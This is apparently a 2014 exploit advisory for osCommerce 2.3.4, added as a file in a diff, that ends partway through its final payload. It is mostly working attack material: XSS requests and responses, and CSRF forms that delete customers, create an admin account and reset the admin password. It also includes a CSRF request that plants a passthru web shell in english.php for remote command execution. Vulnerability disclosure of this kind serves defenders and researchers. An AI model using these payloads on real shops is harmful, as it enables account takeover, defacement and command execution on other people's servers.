@@ -1,0 +1,421 @@
+id: 22424
+date: 07/10/2014
+title: osCommerce 2.3.4 - Multiple vulnerabilities
+author: Smash_
+cves: 
+
+#Title: osCommerce 2.3.4 - Multiple vulnerabilities
+#Date: 10.07.14
+#Affected versions: => 2.3.4 (latest atm)
+#Vendor: oscommerce.com
+#Tested on: Apache 2.2.22 [at] Debian
+#Contact: smash [at] devilteam.pl
+
+#Cross Site Scripting
+
+ 1. Reflected XSS -> Send Email
+
+Vulnerable parameters - customers_email_address & mail_sent_to
+
+a) POST
+
+Request:
+POST /osc/oscommerce-2.3.4/catalog/admin/mail.php?action=preview HTTP/1.1
+Host: localhost
+
+customers_email_address=<script>alert(666)</script>&from=fuck@shit.up&subject=test&message=test
+
+Response:
+HTTP/1.1 200 OK
+(...)
+<td class="smallText"><strong>Customer:</strong><br /><script>alert(666)</script></td>
+</tr>
+(...)
+
+CSRF PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/mail.php?action=preview" method="POST">
+      <input type="hidden" name="customers&#95;email&#95;address" value="<script>alert&#40;666&#41;<&#47;script>" />
+      <input type="hidden" name="from" value="fuck&#64;shit&#46;up" />
+      <input type="hidden" name="subject" value="test" />
+      <input type="hidden" name="message" value="test" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+b) GET
+
+Request:
+GET /osc/oscommerce-2.3.4/catalog/admin/mail.php?mail_sent_to=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1
+Host: localhost
+
+Response:
+(...)
+<td class="messageStackSuccess"><img src="images/icons/success.gif" border="0" alt="Success" title="Success" />&nbps;Notice: Email sent to: <script>alert(666)</script></td>
+</tr>
+(...)
+
+
+ 2. Persistent XSS via CSRF -> Newsletter
+
+Request:
+POST /osc/oscommerce-2.3.4/catalog/admin/newsletters.php?action=insert HTTP/1.1
+Host: localhost
+
+module=newsletter&title=<script>alert(123)</script>&content=<script>alert(456)</script>
+
+CSRF PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?action=insert" method="POST">
+      <input type="hidden" name="module" value="newsletter" />
+      <input type="hidden" name="title" value="<script>alert&#40;123&#41;<&#47;script>" />
+      <input type="hidden" name="content" value="<script>alert&#40;456&#41;<&#47;script>" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+First popbox (123) will be executed whenever someone will visit newsletters page:
+localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php
+
+(...)
+<td class="dataTableContent"><a href="http://localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?page=1&nID=2&action=preview"><img src="images/icons/preview.gif" border="0" alt="Preview" title="Preview" /></a>&nbps;<script>alert(123)</script></td>
+(...)
+<tr class="infoBoxHeading">
+<td class="infoBoxHeading"><strong><script>alert(123)</script></strong></td>
+</tr>
+(...)
+
+Second one, will be executed whenever someone will visit specific newsletter page:
+localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?page=1&nID=1&action=preview
+
+(...)
+<tr>
+<td><tt><script>alert(456)</script></tt></td>
+</tr>
+<tr>
+(...)
+
+3. Persistent XSS via CSRF -> Banner manager
+
+Vulnerable parameter - banners_title
+
+PoC:
+<html>
+  <body>
+    <script>
+      function go()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php?action=insert", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------19390593192018454503847724432");
+        xhr.withCredentials = true;
+        var body = "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_title\"\r\n" + 
+          "\r\n" + 
+          "\x3cscript\x3ealert(666)\x3c/script\x3e\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_url\"\r\n" + 
+          "\r\n" + 
+          "url\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_group\"\r\n" + 
+          "\r\n" + 
+          "footer\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"new_banners_group\"\r\n" + 
+          "\r\n" + 
+          "group\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_image\"; filename=\"info.gif\"\r\n" + 
+          "Content-Type: application/x-php\r\n" + 
+          "\r\n" + 
+          "\x3c?php\n" + 
+          "phpinfo();\n" + 
+          "?\x3e\n" + 
+          "\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_image_local\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_image_target\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"banners_html_text\"\r\n" + 
+          "\r\n" + 
+          "sup\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"date_scheduled\"\r\n" + 
+          "\r\n" + 
+          "2014-07-01\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"expires_date\"\r\n" + 
+          "\r\n" + 
+          "2014-07-31\r\n" + 
+          "-----------------------------19390593192018454503847724432\r\n" + 
+          "Content-Disposition: form-data; name=\"expires_impressions\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------19390593192018454503847724432--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Go" onclick="go();" />
+    </form>
+  </body>
+</html>
+
+JS will be executed whenever someone will visitd banner manager page or specific banner page.
+
+localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php
+localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php?page=1&bID=[ID]
+
+Response:
+<td class="dataTableContent"><a href="javascript:popupImageWindow('popup_image.php?banner=3')"><img src="images/icon_popup.gif" border="0" alt="View Banner" title="View Banner" /></a>&nbps;<script>alert(666)</script></td>
+<td class="dataTableContent" align="right">group</td>
+
+
+ 4. Persistent XSS via CSRF -> Locations / Taxes
+
+Countries tab is taken as example, but same vulnerability affects other tabs in 'Locations / Taxes', namely Tax Classes, Tax Rates, Tax Zones and Zones.
+
+ PoC:
+ <html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&action=insert" method="POST">
+      <input type="hidden" name="countries&#95;name" value="AAAA<script>alert&#40;666&#41;<&#47;script>" />
+      <input type="hidden" name="countries&#95;iso&#95;code&#95;2" value="xs" />
+      <input type="hidden" name="countries&#95;iso&#95;code&#95;3" value="sed" />
+      <input type="hidden" name="address&#95;format&#95;id" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+JS will be executed whenever someone will visitd 'countries' tab:
+localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php
+
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&cID=241&action=edit'">
+<td class="dataTableContent">AAAA<script>alert(666)</script></td>
+<td class="dataTableContent" align="center" width="40">xs</td>
+<td class="dataTableContent" align="center" width="40">sed</td>
+(...)
+
+ 5. Persistent XSS via CSRF -> Localization
+
+ a) Currencies
+
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&action=insert" method="POST">
+      <input type="hidden" name="cs" value="" />
+      <input type="hidden" name="title" value="<script>alert&#40;666&#41;<&#47;script>" />
+      <input type="hidden" name="code" value="666" />
+      <input type="hidden" name="symbol&#95;left" value="hm" />
+      <input type="hidden" name="symbol&#95;right" value="mh" />
+      <input type="hidden" name="decimal&#95;point" value="10" />
+      <input type="hidden" name="thousands&#95;point" value="100" />
+      <input type="hidden" name="decimal&#95;places" value="10000" />
+      <input type="hidden" name="value" value="666&quot;><script>alert&#40;123&#41;<&#47;script>" />
+      <input type="hidden" name="default" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+JS will be executed whenever someone will visit currencies tab:
+localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php
+
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&cID=3&action=edit'">
+<td class="dataTableContent"><strong><script>alert(666)</script> (default)</strong></td>
+<td class="dataTableContent">666</td>
+<td class="dataTableContent" align="right">666.00000000</td>
+(...)
+ 
+ b) Languages
+
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php?action=insert" method="POST">
+      <input type="hidden" name="name" value="&quot;><script>alert&#40;666&#41;<&#47;script>" />
+      <input type="hidden" name="code" value="h3ll" />
+      <input type="hidden" name="image" value="icon&#46;gif" />
+      <input type="hidden" name="directory" value="asdf" />
+      <input type="hidden" name="sort&#95;order" value="asdf" />
+      <input type="hidden" name="default" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+JS will be executed whenever someone will visit langauges tab:
+localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php
+
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php?page=1&lID=2&action=edit'">
+<td class="dataTableContent"><script>alert(666)</script></td>
+<td class="dataTableContent">66</td>
+(...)
+
+ c) Orders status
+
+Request:
+POST /osc/oscommerce-2.3.4/catalog/admin/orders_status.php?page=1&action=insert HTTP/1.1
+Host: localhost
+
+orders_status_name%5B2%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B3%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B4%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B5%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B6%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B7%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B1%5D=%27%3E%22%3E%3C%3EXSS
+
+Response:
+(...)
+<td class="dataTableContent">'>"><>XSS</td>
+(...)
+<td class="infoBoxHeading"><strong>'>"><>XSS</strong></td>
+(...)
+<td class="infoBoxContent"><br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="<script>alert(666)</script>" title="<script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf'>&quot;><>XSS/images/icon.gif'>&quot;><>XSS" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif'>&quot;><>XSS" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif'>&quot;><>XSS" border="0" alt="&quot;><script>alert(666)</script>" title="&quot;><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/english/images/icon.gif" border="0" alt="English" title="English" />&nbps;'>"><>XSS</td>
+  </tr>
+
+
+
+#Boring CSRF
+
+ - Remove any item from cart
+
+localhost/osc/oscommerce-2.3.4/catalog/shopping_cart.php?products_id=[ID]&action=remove_product
+
+ - Add item to cart
+
+localhost/osc/oscommerce-2.3.4/catalog/product_info.php?products_id=[ID]&action=add_product
+
+ - Remove address book entry
+
+localhost/osc/oscommerce-2.3.4/catalog/address_book_process.php?delete=1
+
+ - Remove specific country
+
+localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&cID=1&action=deleteconfirm
+
+ - Remove specific currency
+
+localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&cID=[ID]&action=deleteconfirm
+
+ - Change store credentials
+
+I'm to bored to craft another request's, whole 'Configuration' & 'Catalog' panel suffers on CSRF.
+
+localhost/osc/oscommerce-2.3.4/catalog/admin/configuration.php
+
+...and a lot more.
+
+
+
+#Less boring CSRF
+
+ - Send email as admin -> Send email
+
+It is able to send email to specific user, newsletter subscribers and all of them. In this case, '***' stands for sending mail to all customers.
+
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/mail.php?action=send_email_to_user" method="POST">
+      <input type="hidden" name="customers&#95;email&#95;address" value="&#42;&#42;&#42;" />
+      <input type="hidden" name="from" value="&quot;storeowner&quot;&#32;<storemail&#64;lol&#46;lo>" />
+      <input type="hidden" name="subject" value="subject" />
+      <input type="hidden" name="message" value="sup" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+ - Delete / Edit specific user
+
+Remove user PoC:
+localhost/osc/oscommerce-2.3.4/catalog/admin/customers.php?page=1&cID=1&action=deleteconfirm
+
+Edit user PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/customers.php?page=1&cID=1&action=update" method="POST">
+      <input type="hidden" name="default&#95;address&#95;id" value="1" />
+      <input type="hidden" name="customers&#95;gender" value="m" />
+      <input type="hidden" name="customers&#95;firstname" value="juster" />
+      <input type="hidden" name="customers&#95;lastname" value="testing" />
+      <input type="hidden" name="customers&#95;dob" value="07&#47;13&#47;2004" />
+      <input type="hidden" name="customers&#95;email&#95;address" value="szit&#64;szit&#46;szit" />
+      <input type="hidden" name="entry&#95;company" value="asdf" />
+      <input type="hidden" name="entry&#95;street&#95;address" value="asdfasdf" />
+      <input type="hidden" name="entry&#95;suburb" value="asdfsdff" />
+      <input type="hidden" name="entry&#95;postcode" value="66&#45;666" />
+      <input type="hidden" name="entry&#95;city" value="asdfasdf" />
+      <input type="hidden" name="entry&#95;state" value="asdfasdfasdf" />
+      <input type="hidden" name="entry&#95;country&#95;id" value="5" />
+      <input type="hidden" name="customers&#95;telephone" value="123456792" />
+      <input type="hidden" name="customers&#95;fax" value="" />
+      <input type="hidden" name="customers&#95;newsletter" value="1" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+
+ - Add / Edit / Delete admin
+
+Add admin account:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?action=insert" method="POST">
+      <input type="hidden" name="username" value="haxor" />
+      <input type="hidden" name="password" value="pwned" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Change admin (set new password):
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?aID=1&action=save" method="POST">
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="password" value="newpass" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+Remove admin:
+localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?aID=2&action=deleteconfirm
+
+
+ - RCE via CSRF -> Define Languages
+
+It is able to change content of specific file in 'define languages' tab, we're gonna use default english language, and so default files path. File MUST be writable. Value stands for english.php default content; as you can notice, passthru function is being included.
+
+localhost/osc/oscommerce-2.3.4/catalog/includes/languages/english.php?cmd=uname -a
+
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/define_language.php?lngdir=english&filename=english.php&action=save" method="POST">
+      <input type="hidden" name="file&#95;contents" value="<&#63;php&#13;&#10;&#47;&#42;&#13;&#10;&#32;&#32;&#36;Id&#36;&#13;&#10;&#13;&#10;&#32;&#32;osCommerce&#44;&#32;Open&#32;Source&#32;E&#45;Commerce&#32;Solutions&#13;&#10;&#32;&#32;http&#58;&#47;&#47;www&#46;oscommerce&#46;com&#13;&#10;&#13;&#10;&#32;&#32;Copyright&#32;&#40;c&#41;&#32;2013&#32;osCommerce&#13;&#10;&#13;&#10;&#32;&#32;Released&#32;under&#32;the&#32;GNU&#32;General&#32;Public&#32;License&#13;&#10;&#42;&#47;&#13;&#10;&#13;&#10;&#47;&#47;&#32;look&#32;in&#32;your&#32;&#36;PATH&#95;LOCALE&#47;locale&#32;directory&#32;for&#32;available&#32;locales&#13;&#10;&#47;&#47;&#32;or&#32;type&#32;locale&#32;&#45;a&#32;on&#32;the&#32;server&#46;&#13;&#10;&#47;&#47;&#32;Examples&#58;&#13;&#10;&#47;&#47;&#32;on&#32;RedHat&#32;try&#32;&apos;en&#95;US&apos;&#13;&#10;&#47;&#47;&#32;on&#32;FreeBSD&#32;try&#32;&apos;en&#95;US&#46;ISO&#95;8859&#45;1&apos;&#13;&#10;&#47;&#47;&#32;on&#32;Windows&#32;try&#32;&apos;en&apos;&#44;&#32;or&#32;&apos;English&apos;&#13;&#10;&#64;setlocale&#40;LC&#95;ALL&#44;&#32;array&#40;&apos;en&#95;US&#46;UTF&#45;8&apos;&#44;&#32;&apos;en&#95;US&#46;UTF8&apos;&#44;&#32;&apos;enu&#95;usa&apos;&#41;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;DATE&#95;FORMAT&#95;SHORT&apos;&#44;&#32;&apos;&#37;m&#47;&#37;d&#47;&#37;Y&apos;&#41;&#59;&#32;&#32;&#47;&#47;&#32;this&#32;is&#32;used&#32;for&#32;strftime&#40;&#41;&#13;&#10;define&#40;&apos;DATE&#95;FORMAT&#95;LONG&apos;&#44;&#32;&apos;&#37;A&#32;&#37;d&#32;&#37;B&#44;&#32;&#37;Y&apos;&#41;&#59;&#32;&#47;&#47;&#32;this&#32;is&#32;used&#32;for&#32;strftime&#40;&#41;&#13;&#10;define&#40;&apos;DATE&#95;FORMAT&apos;&#44;&#32;&apos;m&#47;d&#47;Y&apos;&#41;&#59;&#32;&#47;&#47;&#32;this&#32;is&#32;used&#32;for&#32;date&#40;&#41;&#13;&#10;define&#40;&apos;DATE&#95;TIME&#95;FORMAT&apos;&#44;&#32;DATE&#95;FORMAT&#95;SHORT&#32;&#46;&#32;&apos;&#32;&#37;H&#58;&#37;M&#58;&#37;S&apos;&#41;&#59;&#13;&#10;define&#40;&apos;JQUERY&#95;DATEPICKER&#95;I18N&#95;CODE&apos;&#44;&#32;&apos;&apos;&#41;&#59;&#32;&#47;&#47;&#32;leave&#32;empty&#32;for&#32;en&#95;US&#59;&#32;see&#32;http&#58;&#47;&#47;jqueryui&#46;com&#47;demos&#47;datepicker&#47;&#35;localization&#13;&#10;define&#40;&apos;JQUERY&#95;DATEPICKER&#95;FORMAT&apos;&#44;&#32;&apos;mm&#47;dd&#47;yy&apos;&#41;&#59;&#32;&#47;&#47;&#32;see&#32;http&#58;&#47;&#47;docs&#46;jquery&#46;com&#47;UI&#47;Datepicker&#47;formatDate&#13;&#10;&#13;&#10;&#64;passthru&#40;&#36;&#95;GET&#91;&apos;cmd&apos;&#93;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#47;&#47;&#13;&#10;&#47;&#47;&#32;Return&#32;date&#32;in&#32;raw&#32;format&#13;&#10;&#47;&#47;&#32;&#36;date&#32;should&#32;be&#32;in&#32;format&#32;mm&#47;dd&#47;yyyy&#13;&#10;&#47;&#47;&#32;raw&#32;date&#32;is&#32;in&#32;format&#32;YYYYMMDD&#44;&#32;or&#32;DDMMYYYY&#13;&#10;function&#32;tep&#95;date&#95;raw&#40;&#36;date&#44;&#32;&#36;reverse&#32;&#61;&#32;false&#41;&#32;&#123;&#13;&#10;&#32;&#32;if&#32;&#40;&#36;reverse&#41;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;return&#32;substr&#40;&#36;date&#44;&#32;3&#44;&#32;2&#41;&#32;&#46;&#32;substr&#40;&#36;date&#44;&#32;0&#44;&#32;2&#41;&#32;&#46;&#32;substr&#40;&#36;date&#44;&#32;6&#44;&#32;4&#41;&#59;&#13;&#10;&#32;&#32;&#125;&#32;else&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;return&#32;substr&#40;&#36;date&#44;&#32;6&#44;&#32;4&#41;&#32;&#46;&#32;substr&#40;&#36;date&#44;&#32;0&#44;&#32;2&#41;&#32;&#46;&#32;substr&#40;&#36;date&#44;&#32;3&#44;&#32;2&#41;&#59;&#13;&#10;&#32;&#32;&#125;&#13;&#10;&#125;&#13;&#10;&#13;&#10;&#47;&#47;&#32;if&#32;USE&#95;DEFAULT&#95;LANGUAGE&#95;CURRENCY&#32;is&#32;true&#44;&#32;use&#32;the&#32;following&#32;currency&#44;&#32;instead&#32;of&#32;the&#32;applications&#32;default&#32;currency&#32;&#40;used&#32;when&#32;changing&#32;language&#41;&#13;&#10;define&#40;&apos;LANGUAGE&#95;CURRENCY&apos;&#44;&#32;&apos;USD&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;Global&#32;entries&#32;for&#32;the&#32;<html>&#32;tag&#13;&#10;define&#40;&apos;HTML&#95;PARAMS&apos;&#44;&#32;&apos;dir&#61;&quot;ltr&quot;&#32;lang&#61;&quot;en&quot;&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;charset&#32;for&#32;web&#32;pages&#32;and&#32;emails&#13;&#10;define&#40;&apos;CHARSET&apos;&#44;&#32;&apos;utf&#45;8&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;page&#32;title&#13;&#10;define&#40;&apos;TITLE&apos;&#44;&#32;STORE&#95;NAME&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;header&#32;text&#32;in&#32;includes&#47;header&#46;php&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;CREATE&#95;ACCOUNT&apos;&#44;&#32;&apos;Create&#32;an&#32;Account&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;MY&#95;ACCOUNT&apos;&#44;&#32;&apos;My&#32;Account&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;CART&#95;CONTENTS&apos;&#44;&#32;&apos;Cart&#32;Contents&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;CHECKOUT&apos;&#44;&#32;&apos;Checkout&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;TOP&apos;&#44;&#32;&apos;Top&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;CATALOG&apos;&#44;&#32;&apos;Catalog&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;LOGOFF&apos;&#44;&#32;&apos;Log&#32;Off&apos;&#41;&#59;&#13;&#10;define&#40;&apos;HEADER&#95;TITLE&#95;LOGIN&apos;&#44;&#32;&apos;Log&#32;In&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;footer&#32;text&#32;in&#32;includes&#47;footer&#46;php&#13;&#10;define&#40;&apos;FOOTER&#95;TEXT&#95;REQUESTS&#95;SINCE&apos;&#44;&#32;&apos;requests&#32;since&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;text&#32;for&#32;gender&#13;&#10;define&#40;&apos;MALE&apos;&#44;&#32;&apos;Male&apos;&#41;&#59;&#13;&#10;define&#40;&apos;FEMALE&apos;&#44;&#32;&apos;Female&apos;&#41;&#59;&#13;&#10;define&#40;&apos;MALE&#95;ADDRESS&apos;&#44;&#32;&apos;Mr&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;FEMALE&#95;ADDRESS&apos;&#44;&#32;&apos;Ms&#46;&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;text&#32;for&#32;date&#32;of&#32;birth&#32;example&#13;&#10;define&#40;&apos;DOB&#95;FORMAT&#95;STRING&apos;&#44;&#32;&apos;mm&#47;dd&#47;yyyy&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;checkout&#32;procedure&#32;text&#13;&#10;define&#40;&apos;CHECKOUT&#95;BAR&#95;DELIVERY&apos;&#44;&#32;&apos;Delivery&#32;Information&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CHECKOUT&#95;BAR&#95;PAYMENT&apos;&#44;&#32;&apos;Payment&#32;Information&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CHECKOUT&#95;BAR&#95;CONFIRMATION&apos;&#44;&#32;&apos;Confirmation&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CHECKOUT&#95;BAR&#95;FINISHED&apos;&#44;&#32;&apos;Finished&#33;&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;pull&#32;down&#32;default&#32;text&#13;&#10;define&#40;&apos;PULL&#95;DOWN&#95;DEFAULT&apos;&#44;&#32;&apos;Please&#32;Select&apos;&#41;&#59;&#13;&#10;define&#40;&apos;TYPE&#95;BELOW&apos;&#44;&#32;&apos;Type&#32;Below&apos;&#41;&#59;&#13;&#10;&#13;&#10;&#47;&#47;&#32;javascript&#32;messages&#13;&#10;define&#40;&apos;JS&#95;ERROR&apos;&#44;&#32;&apos;Errors&#32;have&#32;occured&#32;during&#32;the&#32;process&#32;of&#32;your&#32;form&#46;&#92;n&#92;nPlease&#32;make&#32;the&#32;following&#32;corrections&#58;&#92;n&#92;n&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;JS&#95;REVIEW&#95;TEXT&apos;&#44;&#32;&apos;&#42;&#32;The&#32;&#92;&apos;Review&#32;Text&#92;&apos;&#32;must&#32;have&#32;at&#32;least&#32;&apos;&#32;&#46;&#32;REVIEW&#95;TEXT&#95;MIN&#95;LENGTH&#32;&#46;&#32;&apos;&#32;characters&#46;&#92;n&apos;&#41;&#59;&#13;&#10;define&#40;&apos;JS&#95;REVIEW&#95;RATING&apos;&#44;&#32;&apos;&#42;&#32;You&#32;must&#32;rate&#32;the&#32;product&#32;for&#32;your&#32;review&#46;&#92;n&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;JS&#95;ERROR&#95;NO&#95;PAYMENT&#95;MODULE&#95;SELECTED&apos;&#44;&#32;&apos;&#42;&#32;Please&#32;select&#32;a&#32;payment&#32;method&#32;for&#32;your&#32;order&#46;&#92;n&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;JS&#95;ERROR&#95;SUBMITTED&apos;&#44;&#32;&apos;This&#32;form&#32;has&#32;already&#32;been&#32;submitted&#46;&#32;Please&#32;press&#32;Ok&#32;and&#32;wait&#32;for&#32;this&#32;process&#32;to&#32;be&#32;completed&#46;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;ERROR&#95;NO&#95;PAYMENT&#95;MODULE&#95;SELECTED&apos;&#44;&#32;&apos;Please&#32;select&#32;a&#32;payment&#32;method&#32;for&#32;your&#32;order&#46;&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;CATEGORY&#95;COMPANY&apos;&#44;&#32;&apos;Company&#32;Details&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CATEGORY&#95;PERSONAL&apos;&#44;&#32;&apos;Your&#32;Personal&#32;Details&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CATEGORY&#95;ADDRESS&apos;&#44;&#32;&apos;Your&#32;Address&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CATEGORY&#95;CONTACT&apos;&#44;&#32;&apos;Your&#32;Contact&#32;Information&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CATEGORY&#95;OPTIONS&apos;&#44;&#32;&apos;Options&apos;&#41;&#59;&#13;&#10;define&#40;&apos;CATEGORY&#95;PASSWORD&apos;&#44;&#32;&apos;Your&#32;Password&apos;&#41;&#59;&#13;&#10;&#13;&#10;define&#40;&apos;ENTRY&#95;COMPANY&apos;&#44;&#32;&apos;Company&#32;Name&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;COMPANY&#95;TEXT&apos;&#44;&#32;&apos;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;GENDER&apos;&#44;&#32;&apos;Gender&#58;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;GENDER&#95;ERROR&apos;&#44;&#32;&apos;Please&#32;select&#32;your&#32;Gender&#46;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;GENDER&#95;TEXT&apos;&#44;&#32;&apos;&#42;&apos;&#41;&#59;&#13;&#10;define&#40;&apos;ENTRY&#95;FIRST&#95;N